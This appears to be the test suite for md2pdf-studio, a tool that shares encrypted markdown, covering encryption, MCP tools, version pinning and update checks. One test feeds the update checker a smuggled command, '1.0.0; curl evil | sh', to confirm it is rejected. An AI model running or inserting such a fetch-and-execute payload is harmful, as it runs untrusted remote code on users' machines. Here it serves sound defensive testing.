import assert from 'node:assert/strict';
import { createServer } from 'node:http';
import { mkdtemp, readFile, stat, writeFile } from 'node:fs/promises';
import { tmpdir } from 'node:os';
import { join } from 'node:path';
import { after, before, test } from 'node:test';
import { decrypt } from '../src/crypto.js';
import { parseDuration } from '../src/api.js';
import { handle, INSTRUCTIONS } from '../src/mcp.js';
import { deleteDocument, parseTarget, shareDocument, updateDocument } from '../src/ops.js';
import { readLinks } from '../src/store.js';
import { checkForUpdate, isNewer, runMode, updateMessage, versionReport } from '../src/update.js';
import { upgrade } from '../src/upgrade.js';
import { execFile } from 'node:child_process';
import { fileURLToPath } from 'node:url';
import { mkdir } from 'node:fs/promises';
import { VERSION } from '../src/version.js';

const repoFile = (path) => readFile(new URL('../../' + path, import.meta.url), 'utf8');

// A stand-in for the share API with the same contract as worker.js.
const docs = new Map();
const seen = [];
let server, api;

before(async () => {
    process.env.MD2PDF_HOME = await mkdtemp(join(tmpdir(), 'md2pdf-test-'));
    server = createServer(async (req, res) => {
        let body = '';
        for await (const chunk of req) body += chunk;
        seen.push({ method: req.method, url: req.url, headers: req.headers, body });
        const send = (status, obj) => { res.writeHead(status, { 'content-type': 'application/json' }); res.end(JSON.stringify(obj)); };
        if (req.headers['x-encrypted'] !== 'aes-256-gcm' && req.method !== 'DELETE') return send(400, { error: 'End-to-end encryption is required' });
        const origin = 'http://' + req.headers.host;
        if (req.method === 'POST' && req.url === '/api/save') {
            if (req.headers['x-doc-title'] && req.headers.authorization !== 'Bearer pro-key') {
                return send(403, { error: 'A custom title and description needs a Pro API key.', code: 'pro_required' });
            }
            const id = String(docs.size).padStart(8, 'A');
            docs.set(id, { body, editKey: 'edit' + id });
            const out = { id, editKey: 'edit' + id, url: origin + '/s/' + id, expiresAt: '2099-01-01T00:00:00.000Z', plan: req.headers.authorization ? 'pro' : 'free' };
            if (req.headers['x-burn']) out.burn = true;
            if (req.headers['x-doc-title']) out.title = decodeURIComponent(req.headers['x-doc-title']);
            return send(200, out);
        }
        const id = req.url.split('/').pop();
        const doc = docs.get(id);
        if (!doc) return send(404, { error: 'Document not found' });
        if (req.headers['x-edit-key'] !== doc.editKey) return send(403, { error: 'Unauthorized' });
        if (req.method === 'PUT') { doc.body = body; return send(200, { id, url: origin + '/s/' + id, expiresAt: '2099-01-01T00:00:00.000Z' }); }
        if (req.method === 'DELETE') { docs.delete(id); return send(200, { id, deleted: true }); }
        send(404, {});
    }).listen(0, '127.0.0.1');
    await new Promise((r) => server.once('listening', r));
    api = 'http://127.0.0.1:' + server.address().port;
});

after(() => server.close());

test('share encrypts locally: the server only gets ciphertext, the key stays in the link', async () => {
    const r = await shareDocument({ markdown: '# Secret title\n\nbody', api, name: 'a.md' });
    const key = new URL(r.link).hash.slice(3);
    const sent = seen.at(-1);
    assert.equal(sent.headers['x-encrypted'], 'aes-256-gcm');
    assert.ok(!sent.body.includes('Secret'));
    assert.ok(!JSON.stringify(sent.headers).includes(key));
    assert.equal(await decrypt(sent.body, key), '# Secret title\n\nbody');
});

test('edit key and encryption key are stored privately, and update reuses the key', async () => {
    const r = await shareDocument({ markdown: 'one', api });
    const file = join(process.env.MD2PDF_HOME, 'links.json');
    assert.equal((await stat(file)).mode & 0o777, 0o600);
    const before = (await readLinks()).find((l) => l.id === r.id);
    assert.ok(before.editKey && before.key);
    const u = await updateDocument({ target: r.id, markdown: 'two', api });
    assert.equal(u.link, r.link);
    assert.equal(await decrypt(docs.get(r.id).body, before.key), 'two');
    assert.notEqual(seen.at(-1).body, seen.at(-2).body);
});

test('delete removes the document and forgets it', async () => {
    const r = await shareDocument({ markdown: 'gone', api });
    await deleteDocument({ target: r.link, api });
    assert.ok(!docs.has(r.id));
    assert.ok(!(await readLinks()).some((l) => l.id === r.id));
});

test('links from another machine cannot be changed', async () => {
    await assert.rejects(updateDocument({ target: 'ZZZZZZZZ', markdown: 'x', api }), /No edit key/);
});

test('refuses empty, oversized and non-https targets', async () => {
    await assert.rejects(shareDocument({ markdown: '  ', api }), /empty/);
    await assert.rejects(shareDocument({ markdown: 'x'.repeat(512001), api }), /too large/);
    await assert.rejects(shareDocument({ markdown: 'x', api: 'http://example.com' }), /https/);
});

test('parseTarget takes an ID or a link, and nothing else', () => {
    assert.deepEqual(parseTarget('AbCd1234'), { id: 'AbCd1234', key: null });
    assert.deepEqual(parseTarget('https://md2pdf.studio/s/AbCd1234#k=a_b-c'), { id: 'AbCd1234', key: 'a_b-c' });
    assert.throws(() => parseTarget('https://md2pdf.studio/'), /Not a document link/);
    assert.throws(() => parseTarget('nope'), /Not a document ID/);
});

test('MCP: lists tools, shares, and never lists keys', async () => {
    const init = await handle({ method: 'initialize', params: {} }, api);
    assert.equal(init.serverInfo.name, 'md2pdf-studio');
    const { tools } = await handle({ method: 'tools/list' }, api);
    assert.deepEqual(tools.map((t) => t.name), ['share_markdown', 'update_shared_markdown', 'delete_shared_markdown', 'list_shared_markdown']);
    const shared = await handle({ method: 'tools/call', params: { name: 'share_markdown', arguments: { markdown: '# via mcp' } } }, api);
    assert.match(shared.content[0].text, /\/s\/\w{8}#k=/);
    const listed = await handle({ method: 'tools/call', params: { name: 'list_shared_markdown', arguments: {} } }, api);
    assert.ok(!listed.content[0].text.includes('#k='));
    const bad = await handle({ method: 'tools/call', params: { name: 'share_markdown', arguments: { markdown: '' } } }, api);
    assert.equal(bad.isError, true);
});

test('options travel as headers; the body stays ciphertext', async () => {
    const r = await shareDocument({ markdown: '# opts', api, expires: '7d', burn: true, title: 'Informe: Q3 ñ', description: 'Resumen', apiKey: 'pro-key' });
    const sent = seen.at(-1);
    assert.equal(sent.headers['x-expires-in'], String(7 * 86400));
    assert.equal(sent.headers['x-burn'], '1');
    assert.equal(decodeURIComponent(sent.headers['x-doc-title']), 'Informe: Q3 ñ');
    assert.equal(sent.headers.authorization, 'Bearer pro-key');
    assert.ok(!sent.body.includes('opts'));
    assert.equal(r.burn, true);
    assert.equal(r.plan, 'pro');
    const stored = (await readLinks()).find((l) => l.id === r.id);
    assert.equal(stored.burn, true);
    assert.equal(stored.title, 'Informe: Q3 ñ');
});

test('without options nothing extra is sent, and the key comes from the environment', async () => {
    await shareDocument({ markdown: 'plain', api });
    const bare = seen.at(-1).headers;
    for (const h of ['x-expires-in', 'x-burn', 'x-doc-title', 'authorization']) assert.equal(bare[h], undefined);
    process.env.MD2PDF_API_KEY = 'pro-key';
    try {
        await shareDocument({ markdown: 'with env key', api });
        assert.equal(seen.at(-1).headers.authorization, 'Bearer pro-key');
    } finally {
        delete process.env.MD2PDF_API_KEY;
    }
});

test('server explanations reach the user in plain words', async () => {
    await assert.rejects(shareDocument({ markdown: 'x', api, title: 'Hola' }), /needs a Pro API key/);
    await assert.rejects(shareDocument({ markdown: 'x', api, title: 'Hola', description: undefined, expires: '1h', apiKey: undefined }), /Pro API key/);
});

test('size ceiling depends on having a key', async () => {
    const big = 'x'.repeat(600000);
    await assert.rejects(shareDocument({ markdown: big, api }), /without an API key/);
    await shareDocument({ markdown: big, api, apiKey: 'pro-key' });
});

test('durations: units, seconds and nonsense', () => {
    assert.equal(parseDuration('90m'), 5400);
    assert.equal(parseDuration('12h'), 43200);
    assert.equal(parseDuration('7d'), 604800);
    assert.equal(parseDuration('3600'), 3600);
    assert.throws(() => parseDuration('soon'), /Not a duration/);
});

test('update passes expiry and preview options and never --burn', async () => {
    const r = await shareDocument({ markdown: 'v1', api });
    await updateDocument({ target: r.id, markdown: 'v2', api, expires: '1h', apiKey: 'pro-key', title: '' });
    const sent = seen.at(-1);
    assert.equal(sent.headers['x-expires-in'], '3600');
    assert.equal(sent.headers['x-doc-title'], '');
});

test('MCP: share_markdown accepts the new options', async () => {
    const out = await handle({ method: 'tools/call', params: { name: 'share_markdown', arguments: { markdown: '# once', burn: true, expires_in: '2h' } } }, api);
    assert.match(out.content[0].text, /One-time link/);
    assert.equal(seen.at(-1).headers['x-burn'], '1');
    assert.equal(seen.at(-1).headers['x-expires-in'], '7200');
    const { tools } = await handle({ method: 'tools/list' }, api);
    assert.ok(tools[0].inputSchema.properties.burn && tools[0].inputSchema.properties.expires_in);
    // API keys are never a tool argument: a model should not handle secrets.
    assert.ok(!JSON.stringify(tools).includes('api_key'));
});

test('one version everywhere: package.json, the MCP server and the User-Agent', async () => {
    const pkg = JSON.parse(await readFile(new URL('../package.json', import.meta.url), 'utf8'));
    assert.equal(VERSION, pkg.version);
    const init = await handle({ method: 'initialize', params: {} }, api);
    assert.equal(init.serverInfo.version, VERSION);
    await shareDocument({ markdown: 'which client', api });
    assert.equal(seen.at(-1).headers['user-agent'], 'md2pdf-studio/' + VERSION);
});

test('MCP: initialize carries the sharing rules', async () => {
    const init = await handle({ method: 'initialize', params: {} }, api);
    assert.equal(init.instructions, INSTRUCTIONS);
    assert.match(init.instructions, /secrets/);
    assert.match(init.instructions, /#k=/);
    assert.match(init.instructions, /Never update/);
});

test('the skill is self-contained and every command in it and in the docs is pinned to this version', async () => {
    const skill = await repoFile('public/skill.md');
    assert.match(skill, /^---\nname: md2pdf\ndescription: .+\nmetadata:\n  version: "([\d.]+)"\n---\n/);
    assert.equal(skill.match(/version: "([\d.]+)"/)[1], VERSION);
    // No links at all: the agent never has to fetch anything to follow it.
    assert.doesNotMatch(skill, /https?:\/\//);
    assert.doesNotMatch(skill, /npm (i|install) -g/);
    assert.ok(skill.includes('# md2pdf (skill ' + VERSION + ')'));
    // The old installable text sent agents to fetch and obey a remote file.
    assert.doesNotMatch(skill, /always fetch|follow those instructions/i);
    for (const file of ['public/skill.md', 'cli/README.md', 'public/ai-skill.html', 'public/llms.txt', 'public/llms-full.txt', 'README.md']) {
        const text = await repoFile(file);
        assert.doesNotMatch(text, /npx (-y )?md2pdf-studio(?!@)/, file + ' has an unpinned npx command');
        assert.doesNotMatch(text, /(&quot;|")-y\1,\s*\1md2pdf-studio(?!@)/, file + ' has an unpinned MCP config');
        for (const [, pinned] of text.matchAll(/md2pdf-studio@([0-9][\w.-]*)/g)) {
            assert.equal(pinned, VERSION, file + ' pins md2pdf-studio@' + pinned);
        }
    }
});

test('update check: a newer version number only, at most once a day, never fatal', async () => {
    let calls = 0;
    const registry = (version) => async () => { calls++; return { ok: true, json: async () => ({ version }) }; };
    const day = 86400e3;
    const t0 = Date.parse('2026-11-10T00:00:00Z');
    const check = (now, fetchImpl, enabled = true) => checkForUpdate({ now, current: '0.1.0', enabled, fetchImpl });
    assert.deepEqual(await check(t0, registry('0.2.0')), { current: '0.1.0', latest: '0.2.0', newer: true });
    assert.equal(calls, 1);
    // Within the day the cached answer is used: no request.
    assert.deepEqual(await check(t0 + 3600e3, registry('9.9.9')), { current: '0.1.0', latest: '0.2.0', newer: true });
    assert.equal(calls, 1);
    // Anything that is not a plain version number is ignored.
    assert.equal(await check(t0 + 2 * day, registry('1.0.0; curl evil | sh')), null);
    assert.equal(calls, 2);
    // Offline: no notice and no error.
    assert.equal(await check(t0 + 4 * day, async () => { throw new Error('offline'); }), null);
    // Turned off: not even a request.
    calls = 0;
    assert.equal(await check(t0 + 6 * day, registry('0.2.0'), false), null);
    assert.equal(calls, 0);
    assert.equal(isNewer('0.10.0', '0.9.1'), true);
    assert.equal(isNewer('0.1.0', '0.1.0'), false);
    assert.equal(isNewer('1.0.0-beta.1', '0.1.0'), false);
    // A fresh check skips the cache; the same version is reported as not newer.
    assert.deepEqual(await checkForUpdate({ now: t0 + 6 * day + 1, current: '0.2.0', enabled: true, fresh: true, fetchImpl: registry('0.2.0') }), { current: '0.2.0', latest: '0.2.0', newer: false });
    const found = { current: '0.1.0', latest: '0.2.0' };
    assert.match(updateMessage(found, 'npx'), /npx -y md2pdf-studio@0\.2\.0 changelog.*npx -y md2pdf-studio@0\.2\.0 upgrade/);
    assert.match(updateMessage(found, 'installed'), /npm install -g md2pdf-studio@0\.2\.0/);
    assert.match(updateMessage(found, 'mcp'), /MCP configuration/);
    for (const where of ['npx', 'installed', 'mcp']) assert.doesNotMatch(updateMessage(found, where), /https?:\/\//);
    assert.equal(versionReport({ current: '0.2.0', latest: '0.2.0', newer: false }), 'md2pdf-studio 0.2.0 is the latest version.');
    assert.equal(versionReport(null), '');
    assert.equal(runMode('file:///home/u/.npm/_npx/ab12/node_modules/md2pdf-studio/src/update.js'), 'npx');
    assert.equal(runMode('file:///usr/local/lib/node_modules/md2pdf-studio/src/update.js'), 'installed');
});

test('MCP: a newer version is mentioned once, after a successful call', async () => {
    const notice = { pending: Promise.resolve({ current: '0.1.0', latest: '0.2.0', newer: true }), said: false };
    const call = (markdown) => handle({ method: 'tools/call', params: { name: 'share_markdown', arguments: { markdown } } }, api, notice);
    assert.equal((await call('')).isError, true);
    assert.equal(notice.said, false);
    assert.match((await call('# first')).content[0].text, /0\.2\.0 is available.*MCP configuration/);
    assert.doesNotMatch((await call('# second')).content[0].text, /is available/);
});

// Runs the real CLI in its own process, with this test's MD2PDF_HOME.
const BIN = fileURLToPath(new URL('../bin/md2pdf-studio.js', import.meta.url));
function run(args) {
    return new Promise((resolve) => {
        execFile(process.execPath, [BIN, ...args], { env: process.env }, (err, stdout, stderr) => {
            resolve({ code: err ? err.code : 0, stdout, stderr });
        });
    });
}

// Today's cached answer from npm, so these tests never reach the network.
async function cacheLatest(latest) {
    await writeFile(join(process.env.MD2PDF_HOME, 'update-check.json'), JSON.stringify({ checkedAt: Date.now(), latest }));
}

test('help says whether this is the latest version; --version keeps stdout to the number', async () => {
    await cacheLatest('9.0.0');
    const help = await run(['-h']);
    assert.equal(help.code, 0);
    assert.match(help.stdout, /upgrade/);
    assert.match(help.stdout, /md2pdf-studio 9\.0\.0 is available \(this is [\d.]+\)\. See what changed: npx -y md2pdf-studio@9\.0\.0 changelog/);
    await cacheLatest(VERSION);
    assert.match((await run(['--help'])).stdout, new RegExp('md2pdf-studio ' + VERSION.replace(/\./g, '\\.') + ' is the latest version'));
    const bare = await run([]);
    assert.equal(bare.code, 2);
    assert.match(bare.stdout, /is the latest version/);
    await cacheLatest('9.0.0');
    const version = await run(['--version']);
    assert.equal(version.stdout, VERSION + '\n');
    assert.match(version.stderr, /9\.0\.0 is available/);
});

test('changelog: printed by the CLI, and it has an entry for this version', async () => {
    const { code, stdout } = await run(['changelog']);
    assert.equal(code, 0);
    assert.match(stdout, /^# Changelog/);
    assert.match(stdout, new RegExp('^## \\[' + VERSION.replace(/\./g, '\\.') + '\\] - \\d{4}-\\d{2}-\\d{2}$', 'm'));
    assert.match(stdout, /^## \[Unreleased\]$/m);
    const pkg = JSON.parse(await readFile(new URL('../package.json', import.meta.url), 'utf8'));
    assert.ok(pkg.files.includes('CHANGELOG.md'));
});

test('upgrade: reinstalls an older skill with the latest version, and only then', async () => {
    const dir = join(process.env.MD2PDF_HOME, 'skills', 'md2pdf');
    const installs = [];
    const install = async (version, where) => { installs.push([version, where]); };
    const newer = async () => ({ current: '0.1.0', latest: '0.2.0', newer: true });

    // No skill installed: nothing is written, the install command is given.
    let r = await upgrade({ dir, check: newer, install, mode: 'npx' });
    assert.equal(installs.length, 0);
    assert.match(r.text, /No skill installed .* npx -y md2pdf-studio@0\.2\.0 skill --install/);

    // An older skill: reinstalled with the new version.
    await mkdir(dir, { recursive: true });
    await writeFile(join(dir, 'SKILL.md'), '---\nname: md2pdf\n---\n\n# md2pdf (skill 0.1.0)\n');
    r = await upgrade({ dir, check: newer, install, mode: 'installed' });
    assert.deepEqual(installs, [['0.2.0', dir]]);
    assert.match(r.text, /from 0\.1\.0 to 0\.2\.0/);
    assert.match(r.text, /MCP configuration/);
    assert.match(r.text, /npm install -g md2pdf-studio@0\.2\.0/);

    // Already current: nothing to do.
    await writeFile(join(dir, 'SKILL.md'), '# md2pdf (skill 0.2.0)\n');
    r = await upgrade({ dir, check: async () => ({ current: '0.2.0', latest: '0.2.0', newer: false }), install, mode: 'npx' });
    assert.equal(installs.length, 1);
    assert.match(r.text, /already 0\.2\.0[\s\S]*is the latest version/);

    // A skill newer than npm's latest (an unreleased build) is never downgraded.
    await writeFile(join(dir, 'SKILL.md'), '# md2pdf (skill 0.3.0)\n');
    r = await upgrade({ dir, check: async () => ({ current: '0.3.0', latest: '0.2.0', newer: false }), install, mode: 'npx' });
    assert.equal(installs.length, 1);
    assert.match(r.text, /already 0\.3\.0/);

    // The old text with no version, which fetched instructions from the site, is replaced.
    await writeFile(join(dir, 'SKILL.md'), '---\nname: md2pdf\n---\n\nBefore creating or sharing a document, always fetch the latest skill instructions\n');
    r = await upgrade({ dir, check: newer, install, mode: 'npx' });
    assert.deepEqual(installs.at(-1), ['0.2.0', dir]);
    assert.match(r.text, /from unknown to 0\.2\.0/);

    // npm unreachable: says so instead of guessing.
    await assert.rejects(upgrade({ dir, check: async () => null, install }), /Could not reach npm/);
});
